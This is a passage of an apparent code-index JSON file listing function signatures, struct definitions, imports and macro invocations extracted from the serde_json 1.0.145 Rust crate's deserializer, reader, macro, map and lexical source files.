          "fn scan_integer128(&mut self, buf: &mut String) -> Result<()> {",
          "fn fix_position(&self, err: Error) -> Error {",
          "fn parse_ident(&mut self, ident: &[u8]) -> Result<()> {",
          "fn parse_integer(&mut self, positive: bool) -> Result<ParserNumber> {",
          "fn parse_number(&mut self, positive: bool, significand: u64) -> Result<ParserNumber> {",
          "fn parse_decimal(",
          "fn parse_exponent(",
          "fn f64_from_parts(&mut self, positive: bool, significand: u64, exponent: i32) -> Result<f64> {",
          "fn f64_from_parts(",
          "fn parse_long_integer(&mut self, positive: bool, partial_significand: u64) -> Result<f64> {",
          "fn parse_long_integer(&mut self, positive: bool, significand: u64) -> Result<f64> {",
          "fn parse_long_decimal(&mut self, positive: bool, integer_end: usize) -> Result<f64> {",
          "fn parse_long_exponent(&mut self, positive: bool, integer_end: usize) -> Result<f64> {",
          "fn parse_decimal_overflow(",
          "fn parse_decimal_overflow(",
          "fn parse_exponent_overflow(",
          "fn f64_long_from_parts(",
          "fn parse_any_signed_number(&mut self) -> Result<ParserNumber> {",
          "fn parse_any_number(&mut self, positive: bool) -> Result<ParserNumber> {",
          "fn parse_any_number(&mut self, positive: bool) -> Result<ParserNumber> {",
          "fn scan_or_eof(&mut self, buf: &mut String) -> Result<u8> {",
          "fn scan_integer(&mut self, buf: &mut String) -> Result<()> {",
          "fn scan_number(&mut self, buf: &mut String) -> Result<()> {",
          "fn scan_decimal(&mut self, buf: &mut String) -> Result<()> {",
          "fn scan_exponent(&mut self, e: char, buf: &mut String) -> Result<()> {",
          "fn parse_object_colon(&mut self) -> Result<()> {",
          "fn end_seq(&mut self) -> Result<()> {",
          "fn end_map(&mut self) -> Result<()> {",
          "fn ignore_value(&mut self) -> Result<()> {",
          "fn ignore_integer(&mut self) -> Result<()> {",
          "fn ignore_decimal(&mut self) -> Result<()> {",
          "fn ignore_exponent(&mut self) -> Result<()> {",
          "fn deserialize_raw_value<V>(&mut self, visitor: V) -> Result<V::Value>",
          "fn from_str(s: &str) -> result::Result<Self, Self::Err> {",
          "fn $method<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_any<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_bool<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_char<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_str<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_string<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_bytes<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_byte_buf<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_option<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_unit<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_unit_struct<V>(self, _name: &'static str, visitor: V) -> Result<V::Value>",
          "fn deserialize_newtype_struct<V>(self, name: &str, visitor: V) -> Result<V::Value>",
          "fn deserialize_seq<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_tuple<V>(self, _len: usize, visitor: V) -> Result<V::Value>",
          "fn deserialize_tuple_struct<V>(",
          "fn deserialize_map<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_struct<V>(",
          "fn deserialize_enum<V>(",
          "fn deserialize_identifier<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_ignored_any<V>(self, visitor: V) -> Result<V::Value>",
          "fn new(de: &'a mut Deserializer<R>) -> Self {",
          "fn next_element_seed<T>(&mut self, seed: T) -> Result<Option<T::Value>>",
          "fn has_next_element<'de, 'a, R: Read<'de> + 'a>(",
          "fn new(de: &'a mut Deserializer<R>) -> Self {",
          "fn next_key_seed<K>(&mut self, seed: K) -> Result<Option<K::Value>>",
          "fn has_next_key<'de, 'a, R: Read<'de> + 'a>(map: &mut MapAccess<'a, R>) -> Result<bool> {",
          "fn next_value_seed<V>(&mut self, seed: V) -> Result<V::Value>",
          "fn new(de: &'a mut Deserializer<R>) -> Self {",
          "fn variant_seed<V>(self, seed: V) -> Result<(V::Value, Self)>",
          "fn unit_variant(self) -> Result<()> {",
          "fn newtype_variant_seed<T>(self, seed: T) -> Result<T::Value>",
          "fn tuple_variant<V>(self, _len: usize, visitor: V) -> Result<V::Value>",
          "fn struct_variant<V>(self, fields: &'static [&'static str], visitor: V) -> Result<V::Value>",
          "fn new(de: &'a mut Deserializer<R>) -> Self {",
          "fn variant_seed<V>(self, seed: V) -> Result<(V::Value, Self)>",
          "fn unit_variant(self) -> Result<()> {",
          "fn newtype_variant_seed<T>(self, _seed: T) -> Result<T::Value>",
          "fn tuple_variant<V>(self, _len: usize, _visitor: V) -> Result<V::Value>",
          "fn struct_variant<V>(self, _fields: &'static [&'static str], _visitor: V) -> Result<V::Value>",
          "fn $method<V>(self, visitor: V) -> Result<V::Value>",
          "fn $method<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_any<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_bool<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_option<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_newtype_struct<V>(self, name: &'static str, visitor: V) -> Result<V::Value>",
          "fn deserialize_enum<V>(",
          "fn deserialize_bytes<V>(self, visitor: V) -> Result<V::Value>",
          "fn deserialize_byte_buf<V>(self, visitor: V) -> Result<V::Value>",
          "fn peek_end_of_value(&mut self) -> Result<()> {",
          "fn next(&mut self) -> Option<Result<T>> {",
          "fn from_trait<'de, R, T>(read: R) -> Result<T>"
        ],
        "struct_defs": [
          "struct SeqAccess<'a, R: 'a> {",
          "struct MapAccess<'a, R: 'a> {",
          "struct VariantAccess<'a, R: 'a> {",
          "struct UnitVariantAccess<'a, R: 'a> {",
          "struct MapKey<'a, R: 'a> {"
        ],
        "impl_blocks": [
          "impl ParserNumber {",
          "impl FromStr for Number {"
        ],
        "uses": [
          "use crate::error::{Error, ErrorCode, Result};",
          "use crate::lexical;",
          "use crate::number::Number;",
          "use crate::read::{self, Fused, Reference};",
          "use alloc::string::String;",
          "use alloc::vec::Vec;",
          "use core::iter;",
          "use core::iter::FusedIterator;",
          "use core::marker::PhantomData;",
          "use core::result;",
          "use core::str::FromStr;",
          "use serde::de::{self, Expected, Unexpected};",
          "use serde::forward_to_deserialize_any;",
          "use crate::number::NumberDeserializer;"
        ],
        "macros": [
          "match tri!(self.parse_whitespace()) {",
          "///         json = format!(\"[{}]\", json);",
          "Ok(tri!(self.peek()).unwrap_or(b'\\x00'))",
          "Ok(tri!(self.next_char()).unwrap_or(b'\\x00'))",
          "match tri!(self.peek()) {",
          "let peek = match tri!(self.parse_whitespace()) {",
          "tri!(self.parse_integer(false)).visit(visitor)",
          "b'0'..=b'9' => tri!(self.parse_integer(true)).visit(visitor),",
          "match tri!(self.parse_whitespace()) {",
          "tri!(self.scan_integer128(&mut buf));",
          "match tri!(self.parse_whitespace()) {",
          "tri!(self.scan_integer128(&mut buf));",
          "match tri!(self.next_char_or_null()) {",
          "match tri!(self.peek_or_null()) {",
          "while let c @ b'0'..=b'9' = tri!(self.peek_or_null()) {",
          "match tri!(self.next_char()) {",
          "let next = match tri!(self.next_char()) {",
          "match tri!(self.peek_or_null()) {",
          "match tri!(self.peek_or_null()) {",
          "if overflow!(significand * 10 + digit, u64::MAX) {",
          "return Ok(ParserNumber::F64(tri!(",
          "Ok(match tri!(self.peek_or_null()) {",
          "b'.' => ParserNumber::F64(tri!(self.parse_decimal(positive, significand, 0))),",
          "b'e' | b'E' => ParserNumber::F64(tri!(self.parse_exponent(positive, significand,",
          "while let c @ b'0'..=b'9' = tri!(self.peek_or_null()) {",
          "if overflow!(significand * 10 + digit, u64::MAX) {",
          "match tri!(self.peek()) {",
          "match tri!(self.peek_or_null()) {",
          "let positive_exp = match tri!(self.peek_or_null()) {",
          "let next = match tri!(self.next_char()) {",
          "while let c @ b'0'..=b'9' = tri!(self.peek_or_null()) {",
          "if overflow!(exp * 10 + digit, i32::MAX) {",
          "match tri!(self.peek_or_null()) {",
          "match tri!(self.peek_or_null()) {",
          "while let c @ b'0'..=b'9' = tri!(self.peek_or_null()) {",
          "match tri!(self.peek()) {",
          "match tri!(self.peek_or_null()) {",
          "let positive_exp = match tri!(self.peek_or_null()) {",
          "let next = match tri!(self.next_char()) {",
          "while let c @ b'0'..=b'9' = tri!(self.peek_or_null()) {",
          "if overflow!(exp * 10 + digit, i32::MAX) {",
          "while let b'0'..=b'9' = tri!(self.peek_or_null()) {",
          "match tri!(self.peek_or_null()) {",
          "while let b'0'..=b'9' = tri!(self.peek_or_null()) {",
          "let peek = match tri!(self.peek()) {",
          "let value = match tri!(self.peek()) {",
          "tri!(self.scan_integer(&mut buf));",
          "match tri!(self.next_char()) {",
          "match tri!(self.scan_or_eof(buf)) {",
          "match tri!(self.peek_or_null()) {",
          "match tri!(self.peek_or_null()) {",
          "match tri!(self.peek_or_null()) {",
          "while let c @ b'0'..=b'9' = tri!(self.peek_or_null()) {",
          "match tri!(self.peek()) {",
          "match tri!(self.peek_or_null()) {",
          "match tri!(self.peek_or_null()) {",
          "match tri!(self.scan_or_eof(buf)) {",
          "while let c @ b'0'..=b'9' = tri!(self.peek_or_null()) {",
          "match tri!(self.parse_whitespace()) {",
          "match tri!(self.parse_whitespace()) {",
          "match tri!(self.parse_whitespace()) {",
          "let peek = match tri!(self.parse_whitespace()) {",
          "tri!(self.parse_ident(b\"ull\"));",
          "tri!(self.parse_ident(b\"rue\"));",
          "tri!(self.parse_ident(b\"alse\"));",
          "tri!(self.ignore_integer());",
          "tri!(self.ignore_integer());",
          "tri!(self.read.ignore_str());",
          "match tri!(self.parse_whitespace()) {",
          "_ => unreachable!(),",
          "_ => unreachable!(),",
          "match tri!(self.parse_whitespace()) {",
          "tri!(self.read.ignore_str());",
          "match tri!(self.parse_whitespace()) {",
          "match tri!(self.next_char_or_null()) {",
          "if let b'0'..=b'9' = tri!(self.peek_or_null()) {",
          "while let b'0'..=b'9' = tri!(self.peek_or_null()) {",
          "match tri!(self.peek_or_null()) {",
          "while let b'0'..=b'9' = tri!(self.peek_or_null()) {",
          "match tri!(self.peek_or_null()) {",
          "match tri!(self.peek_or_null()) {",
          "match tri!(self.next_char_or_null()) {",
          "while let b'0'..=b'9' = tri!(self.peek_or_null()) {",
          "tri!(self.parse_whitespace());",
          "tri!(self.ignore_value());",
          "deserialize_number!($method, deserialize_number);",
          "let peek = match tri!(self.parse_whitespace()) {",
          "tri!(self.parse_ident(b\"ull\"));",
          "tri!(self.parse_ident(b\"rue\"));",
          "tri!(self.parse_ident(b\"alse\"));",
          "tri!(self.parse_any_number(false)).visit(visitor)",
          "b'0'..=b'9' => tri!(self.parse_any_number(true)).visit(visitor),",
          "match tri!(self.read.parse_str(&mut self.scratch)) {",
          "let peek = match tri!(self.parse_whitespace()) {",
          "tri!(self.parse_ident(b\"rue\"));",
          "tri!(self.parse_ident(b\"alse\"));",
          "deserialize_number!(deserialize_i8);",
          "deserialize_number!(deserialize_i16);",
          "deserialize_number!(deserialize_i32);",
          "deserialize_number!(deserialize_i64);",
          "deserialize_number!(deserialize_u8);",
          "deserialize_number!(deserialize_u16);",
          "deserialize_number!(deserialize_u32);",
          "deserialize_number!(deserialize_u64);",
          "deserialize_number!(deserialize_f32);",
          "deserialize_number!(deserialize_f64);",
          "deserialize_number!(deserialize_f32, do_deserialize_f32);",
          "deserialize_number!(deserialize_i128, do_deserialize_i128);",
          "deserialize_number!(deserialize_u128, do_deserialize_u128);",
          "let peek = match tri!(self.parse_whitespace()) {",
          "match tri!(self.read.parse_str(&mut self.scratch)) {",
          "///     assert_eq!(b'\\xe5', bytes[12]);",
          "///     assert_eq!(b'\\0', bytes[13]);",
          "///     assert_eq!(b'\\xe5', bytes[14]);",
          "///     assert_eq!(expected, bytes.as_slice());",
          "let peek = match tri!(self.parse_whitespace()) {",
          "match tri!(self.read.parse_str_raw(&mut self.scratch)) {",
          "match tri!(self.parse_whitespace()) {",
          "tri!(self.parse_ident(b\"ull\"));",
          "let peek = match tri!(self.parse_whitespace()) {",
          "tri!(self.parse_ident(b\"ull\"));",
          "let peek = match tri!(self.parse_whitespace()) {",
          "let peek = match tri!(self.parse_whitespace()) {",
          "let peek = match tri!(self.parse_whitespace()) {",
          "match tri!(self.parse_whitespace()) {",
          "let value = tri!(ret);",
          "match tri!(self.parse_whitespace()) {",
          "tri!(self.ignore_value());",
          "let peek = match tri!(seq.de.parse_whitespace()) {",
          "match tri!(seq.de.parse_whitespace()) {",
          "if tri!(has_next_element(self)) {",
          "Ok(Some(tri!(seed.deserialize(&mut *self.de))))",
          "let peek = match tri!(map.de.parse_whitespace()) {",
          "match tri!(map.de.parse_whitespace()) {",
          "if tri!(has_next_key(self)) {",
          "Ok(Some(tri!(seed.deserialize(MapKey { de: &mut *self.de }))))",
          "tri!(self.de.parse_object_colon());",
          "let val = tri!(seed.deserialize(&mut *self.de));",
          "tri!(self.de.parse_object_colon());",
          "let variant = tri!(seed.deserialize(&mut *self.de));",
          "match tri!(self.de.peek()) {",
          "let value = tri!(self.de.$delegate(visitor));",
          "match tri!(self.de.peek()) {",
          "deserialize_numeric_key!(deserialize_number, deserialize_number);",
          "match tri!(self.de.read.parse_str(&mut self.de.scratch)) {",
          "deserialize_numeric_key!(deserialize_i8);",
          "deserialize_numeric_key!(deserialize_i16);",
          "deserialize_numeric_key!(deserialize_i32);",
          "deserialize_numeric_key!(deserialize_i64);",
          "deserialize_numeric_key!(deserialize_i128, deserialize_i128);",
          "deserialize_numeric_key!(deserialize_u8);",
          "deserialize_numeric_key!(deserialize_u16);",
          "deserialize_numeric_key!(deserialize_u32);",
          "deserialize_numeric_key!(deserialize_u64);",
          "deserialize_numeric_key!(deserialize_u128, deserialize_u128);",
          "deserialize_numeric_key!(deserialize_f32);",
          "deserialize_numeric_key!(deserialize_f32, deserialize_f32);",
          "deserialize_numeric_key!(deserialize_f64);",
          "let peek = match tri!(self.de.next_char()) {",
          "tri!(self.de.parse_ident(b\"rue\\\"\"));",
          "tri!(self.de.parse_ident(b\"alse\\\"\"));",
          "let s = tri!(self.de.read.parse_str(&mut self.de.scratch));",
          "///         println!(\"{}\", value.unwrap());",
          "/// assert_eq!(0, stream.byte_offset());",
          "/// println!(\"{:?}\", stream.next()); // [0]",
          "/// assert_eq!(3, stream.byte_offset());",
          "/// println!(\"{:?}\", stream.next()); // [1]",
          "/// assert_eq!(7, stream.byte_offset());",
          "/// println!(\"{:?}\", stream.next()); // error",
          "/// assert_eq!(8, stream.byte_offset());",
          "match tri!(self.de.peek()) {",
          "let value = tri!(de::Deserialize::deserialize(&mut de));",
          "tri!(de.end());",
          "///     println!(\"{:#?}\", u);",
          "///         println!(\"{:#?}\", read_user_from_stream(&mut buffered));",
          "///     println!(\"{:#?}\", u);",
          "///     println!(\"{:#?}\", u);"
        ],
        "derives": [],
        "error_handling": 146
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/read.rs",
        "function_defs": [
          "fn next(&mut self) -> Result<Option<u8>>;",
          "fn peek(&mut self) -> Result<Option<u8>>;",
          "fn discard(&mut self);",
          "fn position(&self) -> Position;",
          "fn peek_position(&self) -> Position;",
          "fn byte_offset(&self) -> usize;",
          "fn parse_str<'s>(&'s mut self, scratch: &'s mut Vec<u8>) -> Result<Reference<'de, 's, str>>;",
          "fn parse_str_raw<'s>(",
          "fn ignore_str(&mut self) -> Result<()>;",
          "fn decode_hex_escape(&mut self) -> Result<u16>;",
          "fn begin_raw_buffering(&mut self);",
          "fn end_raw_buffering<V>(&mut self, visitor: V) -> Result<V::Value>",
          "fn set_failed(&mut self, failed: &mut bool);",
          "fn deref(&self) -> &Self::Target {",
          "fn parse_str_bytes<'s, T, F>(",
          "fn next(&mut self) -> Result<Option<u8>> {",
          "fn peek(&mut self) -> Result<Option<u8>> {",
          "fn discard(&mut self) {",
          "fn discard(&mut self) {",
          "fn position(&self) -> Position {",
          "fn peek_position(&self) -> Position {",
          "fn byte_offset(&self) -> usize {",
          "fn parse_str<'s>(&'s mut self, scratch: &'s mut Vec<u8>) -> Result<Reference<'de, 's, str>> {",
          "fn parse_str_raw<'s>(",
          "fn ignore_str(&mut self) -> Result<()> {",
          "fn decode_hex_escape(&mut self) -> Result<u16> {",
          "fn begin_raw_buffering(&mut self) {",
          "fn end_raw_buffering<V>(&mut self, visitor: V) -> Result<V::Value>",
          "fn set_failed(&mut self, failed: &mut bool) {",
          "fn position_of_index(&self, i: usize) -> Position {",
          "fn skip_to_escape(&mut self, forbid_control_characters: bool) {",
          "fn skip_to_escape_slow(&mut self) {",
          "fn parse_str_bytes<'s, T, F>(",
          "fn next(&mut self) -> Result<Option<u8>> {",
          "fn peek(&mut self) -> Result<Option<u8>> {",
          "fn discard(&mut self) {",
          "fn position(&self) -> Position {",
          "fn peek_position(&self) -> Position {",
          "fn byte_offset(&self) -> usize {",
          "fn parse_str<'s>(&'s mut self, scratch: &'s mut Vec<u8>) -> Result<Reference<'a, 's, str>> {",
          "fn parse_str_raw<'s>(",
          "fn ignore_str(&mut self) -> Result<()> {",
          "fn decode_hex_escape(&mut self) -> Result<u16> {",
          "fn begin_raw_buffering(&mut self) {",
          "fn end_raw_buffering<V>(&mut self, visitor: V) -> Result<V::Value>",
          "fn set_failed(&mut self, _failed: &mut bool) {",
          "fn next(&mut self) -> Result<Option<u8>> {",
          "fn peek(&mut self) -> Result<Option<u8>> {",
          "fn discard(&mut self) {",
          "fn position(&self) -> Position {",
          "fn peek_position(&self) -> Position {",
          "fn byte_offset(&self) -> usize {",
          "fn parse_str<'s>(&'s mut self, scratch: &'s mut Vec<u8>) -> Result<Reference<'a, 's, str>> {",
          "fn parse_str_raw<'s>(",
          "fn ignore_str(&mut self) -> Result<()> {",
          "fn decode_hex_escape(&mut self) -> Result<u16> {",
          "fn begin_raw_buffering(&mut self) {",
          "fn end_raw_buffering<V>(&mut self, visitor: V) -> Result<V::Value>",
          "fn set_failed(&mut self, failed: &mut bool) {",
          "fn next(&mut self) -> Result<Option<u8>> {",
          "fn peek(&mut self) -> Result<Option<u8>> {",
          "fn discard(&mut self) {",
          "fn position(&self) -> Position {",
          "fn peek_position(&self) -> Position {",
          "fn byte_offset(&self) -> usize {",
          "fn parse_str<'s>(&'s mut self, scratch: &'s mut Vec<u8>) -> Result<Reference<'de, 's, str>> {",
          "fn parse_str_raw<'s>(",
          "fn ignore_str(&mut self) -> Result<()> {",
          "fn decode_hex_escape(&mut self) -> Result<u16> {",
          "fn begin_raw_buffering(&mut self) {",
          "fn end_raw_buffering<V>(&mut self, visitor: V) -> Result<V::Value>",
          "fn set_failed(&mut self, failed: &mut bool) {",
          "fn is_escape(ch: u8, including_control_characters: bool) -> bool {",
          "fn next_or_eof<'de, R>(read: &mut R) -> Result<u8>",
          "fn peek_or_eof<'de, R>(read: &mut R) -> Result<u8>",
          "fn error<'de, R, T>(read: &R, reason: ErrorCode) -> Result<T>",
          "fn as_str<'de, 's, R: Read<'de>>(read: &R, slice: &'s [u8]) -> Result<&'s str> {",
          "fn parse_escape<'de, R: Read<'de>>(",
          "fn parse_unicode_escape<'de, R: Read<'de>>(",
          "fn push_wtf8_codepoint(n: u32, scratch: &mut Vec<u8>) {",
          "fn ignore_escape<'de, R>(read: &mut R) -> Result<()>",
          "fn decode_four_hex_digits(a: u8, b: u8, c: u8, d: u8) -> Option<u16> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::error::{Error, ErrorCode, Result};",
          "use alloc::vec::Vec;",
          "use core::cmp;",
          "use core::mem;",
          "use core::ops::Deref;",
          "use core::str;",
          "use crate::io;",
          "use crate::iter::LineColIterator;",
          "use crate::raw::BorrowedRawDeserializer;",
          "use crate::raw::OwnedRawDeserializer;",
          "use alloc::string::String;",
          "use serde::de::Visitor;"
        ],
        "macros": [
          "let ch = tri!(next_or_eof(self));",
          "tri!(parse_escape(self, validate, scratch));",
          "let ch = tri!(next_or_eof(self));",
          "tri!(ignore_escape(self));",
          "let a = tri!(next_or_eof(self));",
          "let b = tri!(next_or_eof(self));",
          "let c = tri!(next_or_eof(self));",
          "let d = tri!(next_or_eof(self));",
          "tri!(parse_escape(self, validate, scratch));",
          "tri!(ignore_escape(self));",
          "match tri!(read.next()) {",
          "match tri!(read.peek()) {",
          "let ch = tri!(next_or_eof(read));",
          "let mut n = tri!(read.decode_hex_escape());",
          "if tri!(peek_or_eof(read)) == b'\\\\' {",
          "if tri!(peek_or_eof(read)) == b'u' {",
          "let n2 = tri!(read.decode_hex_escape());",
          "0..=0x7F => unreachable!(),",
          "0x11_0000.. => unreachable!(),",
          "let ch = tri!(next_or_eof(read));",
          "tri!(read.decode_hex_escape());"
        ],
        "derives": [],
        "error_handling": 33
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/macros.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "/// let value = json!({",
          "/// let value = json!({",
          "/// let value = json!([",
          "$crate::json_internal!($($json)+)",
          "// macros and can still be invoked as `json_internal!($($json)+)`.",
          "// Must be invoked as: json_internal!(@array [] $($tt)*)",
          "$crate::json_internal!(@array [$($elems,)* $crate::json_internal!(null)] $($rest",
          "$crate::json_internal!(@array [$($elems,)* $crate::json_internal!(true)] $($rest",
          "$crate::json_internal!(@array [$($elems,)* $crate::json_internal!(false)] $($res",
          "$crate::json_internal!(@array [$($elems,)* $crate::json_internal!([$($array)*])]",
          "$crate::json_internal!(@array [$($elems,)* $crate::json_internal!({$($map)*})] $",
          "$crate::json_internal!(@array [$($elems,)* $crate::json_internal!($next),] $($re",
          "$crate::json_internal!(@array [$($elems,)* $crate::json_internal!($last)])",
          "$crate::json_internal!(@array [$($elems,)*] $($rest)*)",
          "$crate::json_unexpected!($unexpected)",
          "// Must be invoked as: json_internal!(@object $map () ($($tt)*) ($($tt)*))",
          "$crate::json_internal!(@object $object () ($($rest)*) ($($rest)*));",
          "$crate::json_unexpected!($unexpected);",
          "$crate::json_internal!(@object $object [$($key)+] ($crate::json_internal!(null))",
          "$crate::json_internal!(@object $object [$($key)+] ($crate::json_internal!(true))",
          "$crate::json_internal!(@object $object [$($key)+] ($crate::json_internal!(false)",
          "$crate::json_internal!(@object $object [$($key)+] ($crate::json_internal!([$($ar",
          "$crate::json_internal!(@object $object [$($key)+] ($crate::json_internal!({$($ma",
          "$crate::json_internal!(@object $object [$($key)+] ($crate::json_internal!($value",
          "$crate::json_internal!(@object $object [$($key)+] ($crate::json_internal!($value",
          "$crate::json_internal!();",
          "$crate::json_internal!();",
          "$crate::json_unexpected!($colon);",
          "$crate::json_unexpected!($comma);",
          "$crate::json_internal!(@object $object ($key) (: $($rest)*) (: $($rest)*));",
          "$crate::json_expect_expr_comma!($($unexpected)+);",
          "$crate::json_internal!(@object $object ($($key)* $tt) ($($rest)*) ($($rest)*));",
          "// Must be invoked as: json_internal!($($json)+)",
          "$crate::Value::Array($crate::json_internal!(@array [] $($tt)+))",
          "$crate::json_internal!(@object object () ($($tt)+) ($($tt)+));"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/map.rs",
        "function_defs": [
          "fn default() -> Self {",
          "fn clone(&self) -> Self {",
          "fn clone_from(&mut self, source: &Self) {",
          "fn eq(&self, other: &Self) -> bool {",
          "fn hash<H: Hasher>(&self, state: &mut H) {",
          "fn index(&self, index: &Q) -> &Value {",
          "fn index_mut(&mut self, index: &Q) -> &mut Value {",
          "fn fmt(&self, formatter: &mut fmt::Formatter) -> Result<(), fmt::Error> {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_unit<E>(self) -> Result<Self::Value, E>",
          "fn visit_map<V>(self, mut visitor: V) -> Result<Self::Value, V::Error>",
          "fn from_iter<T>(iter: T) -> Self",
          "fn extend<T>(&mut self, iter: T)",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn len(&self) -> usize {",
          "fn into_deserializer(self) -> Self::Deserializer {",
          "fn into_deserializer(self) -> Self::Deserializer {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {"
        ],
        "struct_defs": [
          "struct Visitor;"
        ],
        "impl_blocks": [
          "impl Map<String, Value> {",
          "impl Default for Map<String, Value> {",
          "impl Clone for Map<String, Value> {",
          "impl PartialEq for Map<String, Value> {",
          "impl Eq for Map<String, Value> {}",
          "impl Hash for Map<String, Value> {",
          "impl Debug for Map<String, Value> {",
          "impl serde::ser::Serialize for Map<String, Value> {",
          "impl FromIterator<(String, Value)> for Map<String, Value> {",
          "impl Extend<(String, Value)> for Map<String, Value> {",
          "impl $($generics)* Iterator for $name $($generics)* {",
          "impl $($generics)* DoubleEndedIterator for $name $($generics)* {",
          "impl $($generics)* ExactSizeIterator for $name $($generics)* {",
          "impl $($generics)* FusedIterator for $name $($generics)* {}",
          "impl IntoIterator for Map<String, Value> {"
        ],
        "uses": [
          "use crate::error::Error;",
          "use crate::value::Value;",
          "use alloc::string::String;",
          "use alloc::vec::Vec;",
          "use core::borrow::Borrow;",
          "use core::fmt::{self, Debug};",
          "use core::hash::{Hash, Hasher};",
          "use core::iter::FusedIterator;",
          "use core::mem;",
          "use core::ops;",
          "use serde::de;",
          "use alloc::collections::{btree_map, BTreeMap};",
          "use indexmap::IndexMap;",
          "use alloc::collections::btree_map::Entry as EntryImpl;",
          "use indexmap::map::Entry as EntryImpl;",
          "use serde::ser::SerializeMap;"
        ],
        "macros": [
          "/// map[\"key\"] = json!(\"value\");",
          "let mut map = tri!(serializer.serialize_map(Some(self.len())));",
          "tri!(map.serialize_entry(k, v));",
          "while let Some((key, value)) = tri!(visitor.next_entry()) {",
          "/// assert_eq!(map.entry(\"serde\").key(), &\"serde\");",
          "/// map.entry(\"serde\").or_insert(json!(12));",
          "/// assert_eq!(map[\"serde\"], 12);",
          "/// map.entry(\"serde\").or_insert_with(|| json!(\"hoho\"));",
          "/// assert_eq!(map[\"serde\"], \"hoho\".to_owned());",
          "///     .and_modify(|e| *e = json!(\"rust\"))",
          "///     .or_insert(json!(\"cpp\"));",
          "/// assert_eq!(map[\"serde\"], \"cpp\");",
          "///     .and_modify(|e| *e = json!(\"rust\"))",
          "///     .or_insert(json!(\"cpp\"));",
          "/// assert_eq!(map[\"serde\"], \"rust\");",
          "///         assert_eq!(vacant.key(), &\"serde\");",
          "///     Entry::Occupied(_) => unimplemented!(),",
          "///         vacant.insert(json!(\"hoho\"));",
          "///     Entry::Occupied(_) => unimplemented!(),",
          "/// map.insert(\"serde\".to_owned(), json!(12));",
          "///         assert_eq!(occupied.key(), &\"serde\");",
          "///     Entry::Vacant(_) => unimplemented!(),",
          "/// map.insert(\"serde\".to_owned(), json!(12));",
          "///         assert_eq!(occupied.get(), 12);",
          "///     Entry::Vacant(_) => unimplemented!(),",
          "/// map.insert(\"serde\".to_owned(), json!([1, 2, 3]));",
          "///         occupied.get_mut().as_array_mut().unwrap().push(json!(4));",
          "///     Entry::Vacant(_) => unimplemented!(),",
          "/// assert_eq!(map[\"serde\"].as_array().unwrap().len(), 4);",
          "/// map.insert(\"serde\".to_owned(), json!([1, 2, 3]));",
          "///         occupied.into_mut().as_array_mut().unwrap().push(json!(4));",
          "///     Entry::Vacant(_) => unimplemented!(),",
          "/// assert_eq!(map[\"serde\"].as_array().unwrap().len(), 4);",
          "/// map.insert(\"serde\".to_owned(), json!(12));",
          "///         assert_eq!(occupied.insert(json!(13)), 12);",
          "///         assert_eq!(occupied.get(), 13);",
          "///     Entry::Vacant(_) => unimplemented!(),",
          "/// map.insert(\"serde\".to_owned(), json!(12));",
          "///         assert_eq!(occupied.remove(), 12);",
          "///     Entry::Vacant(_) => unimplemented!(),",
          "/// map.insert(\"serde\".to_owned(), json!(12));",
          "///         assert_eq!(key, \"serde\");",
          "///         assert_eq!(value, 12);",
          "///     Entry::Vacant(_) => unimplemented!(),",
          "delegate_iterator!((Iter<'a>) => (&'a String, &'a Value));",
          "delegate_iterator!((IterMut<'a>) => (&'a String, &'a mut Value));",
          "delegate_iterator!((IntoIter) => (String, Value));",
          "delegate_iterator!((Keys<'a>) => &'a String);",
          "delegate_iterator!((Values<'a>) => &'a Value);",
          "delegate_iterator!((ValuesMut<'a>) => &'a mut Value);",
          "delegate_iterator!((IntoValues) => Value);"
        ],
        "derives": [
          "#[derive(Clone, Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Clone, Debug)]",
          "#[derive(Clone, Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 37
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/rounding.rs",
        "function_defs": [
          "fn round_toward(fp: &mut ExtendedFloat, shift: i32) -> bool {",
          "fn downard(_: &mut ExtendedFloat, _: bool) {}"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::float::ExtendedFloat;",
          "use super::num::*;",
          "use super::shift::*;",
          "use core::mem;"
        ],
        "macros": [
          "debug_assert!(n < bits, \"nth_bit() overflow in shl.\");",
